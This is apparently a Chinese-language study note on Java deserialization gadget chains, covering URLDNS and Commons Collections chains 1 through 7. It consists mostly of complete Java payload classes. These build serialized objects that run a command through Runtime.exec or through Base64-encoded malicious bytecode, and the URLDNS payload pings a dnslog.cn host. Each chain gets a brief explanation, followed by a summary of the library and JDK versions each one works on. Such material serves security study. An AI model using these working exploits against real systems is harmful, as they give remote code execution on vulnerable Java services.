##  URLDNS

好处：

因为不需要依赖各种库，所以一是可以用来判断是否存在反序列化漏洞，二是可以判断目标机器是可以出网。



思路：

hashMap的`readObject`-->hash函数-->`URL`类的`hashCode`函数->`URLStreamHandler`的`hashCode`函数，就触发了`getHostAddress`函数

payload:

```java
package cc.URLDNS;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class payload {
    public static void main(String[] args) throws Exception{
        HashMap hashMap=new HashMap();
        URL url=new URL("http://onczel.dnslog.cn");
        Field field=Class.forName("java.net.URL").getDeclaredField("hashCode");
        field.setAccessible(true);
        field.set(url,-1);
        hashMap.put(url,"z3eyond");
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        System.out.println(oos);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}

```

ysoserial

```java
URLStreamHandler handler = new SilentURLStreamHandler();
HashMap ht = new HashMap();
URL u = new URL(null, url, handler); 
ht.put(u, url); 
Reflections.setFieldValue(u, "hashCode", -1);
static class SilentURLStreamHandler extends URLStreamHandler {

    protected URLConnection openConnection(URL u) throws IOException {
        return null;
    }

    protected synchronized InetAddress getHostAddress(URL u) {
        return null;
    }
}

```

代码中没有使用 `field.set(url, 0x123);` ，但是自定了一个类为 `SilentURLStreamHandler`，这个类重写了`getHostAddress()` 函数，重写后的 `getHostAddress()` 是个空的，也就导致在本地生成 poc 的时候不会有 DNS 请求

##  CC链1

###  payload1

思路：`AnnotationInvocationHandler`的`readObject`,到`TransformedMap`的父类的`setValue`，再到`checkSetValue`，从而触发了`transform`函数的一道流程

payload

```java
package cc1;

import java.io.*;
import java.util.Map;
import java.util.HashMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Class[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map in_map=new HashMap();
        in_map.put("value","z3eyond");
        Map out_map = TransformedMap.decorate(in_map,null,chainedTransformer);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor= clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        Object ooo = constructor.newInstance(Target.class,out_map);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(ooo);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```

###  payload2

思路：`AnnotationInvocationHandler`的readObject中的代理对象调用任何方法时，就直接触发了`AnnotationInvocationHandler`的invoke函数，然后到`LazyMap`的get函数，从而触发`transform`的一套流程。

payload

```java
package cc1;

import java.io.*;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Map;
import java.util.HashMap;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class payload2 {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers=new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Class[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer=new ChainedTransformer(transformers);
        Map in_map=new HashMap();
        in_map.put("value","z3eyond");
        Map out_map = LazyMap.decorate(in_map,chainedTransformer);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor= clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler=(InvocationHandler)constructor.newInstance(Target.class,out_map);
        Map proxyMap=(Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[]{Map.class},
                invocationHandler
                );
        Object ooo=constructor.newInstance(Target.class,proxyMap);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(ooo);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```

##  CC2

### payload1

思路：就是`PriorityQueue`的readObject，一步一步到`TransformingComparator`

payload1

```java
package cc.cc2;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

public class payload {
    public static void main(String[] args) throws Exception {
        ChainedTransformer chain = new ChainedTransformer(
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new String[]{"calc"}));
        Comparator comparator=new TransformingComparator(chain);
        PriorityQueue priority=new PriorityQueue(1,null);
        priority.add(1);
        priority.add(2);
        Field field = priority.getClass().getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priority,comparator);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(priority);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}

```

### payload2

思路：触发点都是一样的，没有利用`transformer`的那一套流程去触发calc，而是利用`invokerTransformer`去调用

newTransformer方法，从而可以恶意加载字节码，实现一个命令执行。

payload2

```java
package cc.cc2;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class payload2 {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool=ClassPool.getDefault();
        CtClass ctClass=pool.get(test.class.getName());
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer transformer=new InvokerTransformer("toString",null,null);
        Comparator comparator=new TransformingComparator(transformer);
        PriorityQueue priority=new PriorityQueue(2,comparator);
        priority.add(templates);
        priority.add(templates);
        setFieldValue(transformer,"iMethodName","newTransformer");
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(priority);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}

```

## CC3

思路：利用的CC1的`LazyMap`链和`TransformedMap`链，去调用`InstantiateTransformer`的Transform方法，实例化`TrAXFilter`类，触发`newTransformer`方法，加载恶意字节码

payload

```java
package cc3;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;
public class payload {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        ClassPool pool=ClassPool.getDefault();
        CtClass ctClass=pool.get(test.class.getName());
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] trueTransformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformers);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chainedTransformer);
        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Target.class,map);
        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler);
        Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Target.class,proxy_map);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(handler);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```

## CC4

思路：就是CC2和CC3的结合

payload:

```java
package cc.cc4;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.Comparator;
import java.util.PriorityQueue;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class payload {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        ClassPool pool=ClassPool.getDefault();
        CtClass ctClass=pool.get(test.class.getName());
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{ctClass.toBytecode()});
        setFieldValue(templates, "_name", "z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] trueTransformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer chain= new ChainedTransformer(trueTransformers);
        Comparator comparator=new TransformingComparator(chain);
        PriorityQueue priority=new PriorityQueue(1,null);
        priority.add(1);
        priority.add(2);
        setFieldValue(priority,"comparator",comparator);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(priority);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```

## CC5

思路：跟CC1的差不多，只是有一点点区别。

payload：

```java
package cc.cc5;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class payload {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws  Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_name","z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] trueTransformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer chain= new ChainedTransformer(trueTransformers);
        Map innermap=new HashMap();
        Map outermap=LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedMapEntry=new TiedMapEntry(outermap,"z3eyond");
        BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException(null);
        setFieldValue(badAttributeValueExpException,"val",tiedMapEntry);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(badAttributeValueExpException);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}

```

## CC6

`CC1`用到了`AnnotationInvocationHandler`类，但是`AnnotationInvocationHandler`类的`readObject()`方法在8u71以后逻辑就发生了改变，不能再利用了。CC6解决了高版本Java的限制，而且利用更加通用。

思路：URLDNS+CC5的结合

payload:

```java
package cc.cc6;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class payload3 {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception{
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAGwEAClNvdXJjZUZpbGUBAA1FdmlsVGVzdC5qYXZhDAAOAA8HABwMAB0AHgEABGNhbGMMAB8AIAEACEV2aWxUZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAMAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAAEQALAAAABAABAAwAAQAOAA8AAgAJAAAALgACAAEAAAAOKrcAAbgAAhIDtgAEV7EAAAABAAoAAAAOAAMAAAASAAQAEwANABQACwAAAAQAAQAQAAEAEQAAAAIAEg==");
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_name","z3eyond");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        Transformer[] trueTransformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };
        Transformer[] fakeTransformers = new Transformer[]{
                new ConstantTransformer(1)
        };
        Transformer chain= new ChainedTransformer(fakeTransformers);
        Map lazymap= LazyMap.decorate(new HashMap(),chain);
        TiedMapEntry tiedMapEntry=new TiedMapEntry(lazymap,"zzy1");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "zzy2");
        lazymap.remove("zzy1");
        setFieldValue(chain,"iTransformers",trueTransformers);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(hashMap);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}

```

## CC7

思路：hashtable的readObject,去调用equal方法，触发LazyMap的父类的equals方法，然后调用`hashMap`的父类的`equals`方法，从而调用`LazyMap`的get方法，后面就是一样的了

payload

```java
package cc.cc7;

import cc.reflectPackage.Value;
import cc.unserializePackage.Unserialize;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class payload {
    public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception {
        Field field=obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class}, new String[] {"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{});
        Map lazyMap1 = LazyMap.decorate(new HashMap(), chainedTransformer);
        Map lazyMap2 = LazyMap.decorate(new HashMap(), chainedTransformer);

        lazyMap1.put("uZ", 1);
        lazyMap2.put("ty", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        setFieldValue(chainedTransformer, "iTransformers", transformers);
        lazyMap2.remove("uZ");

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos= new ObjectOutputStream(baos);
        oos.writeObject(hashtable);
        ByteArrayInputStream bais=new ByteArrayInputStream(baos.toByteArray());
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
    }
}


```



## 总结

### 调用链

- URLDNS ：HashMap + URL
- Commons Collections 1 ：AnnotationInvocationHandler + LazyMap/TransformedMap + Transformer
- Commons Collections 2 ：PriorityQueue + TransformingComparator + Transformer/TemplatesImpl
- Commons Collections 3 ：AnnotationInvocationHandler + LazyMap + Transformer + TrAXFilter + TemplatesImpl
- Commons Collections 4 ：PriorityQueue/TreeBag + TransformingComparator + Transformer + TrAXFilter + TemplatesImpl
- Commons Collections 5 ：BadAttributeValueExpException + TiedMapEntry + LazyMap + Transformer
- Commons Collections 6 ：HashMap/HashSet + TiedMapEntry + LazyMap + Transformer
- Commons Collections 7 ：1. Hashtable + TiedMapEntry + LazyMap + Transformer   2.Hashtable + LazyMap的父类+hashMap的父类 + LazyMap + Transformer

而这些链大致分为三段：

- readObject触发
- 调用transform方法
- transform后可以是恶意加载字节码，也可以是单纯的`calc`

### CommonsCollections版本

- 1、3、5、6、7是Commons Collections<=3.2.1中存在的反序列化链。

- 2、4是Commons Collections 4.0以上中存在的反序列化链。

### JDK版本

- 1、3两条链在JDK8u71之后已修复不可利用。这是由于这两条链触发回调的方式均为Map中放⼊⼀个新的元素。

而在Java 8u71之后`AnnotationInvocationHandler`代码发生了变动。

```java
private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }
...
}
```

改动后，不再直接使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执行set或put操作，也就不会触发RCE了。





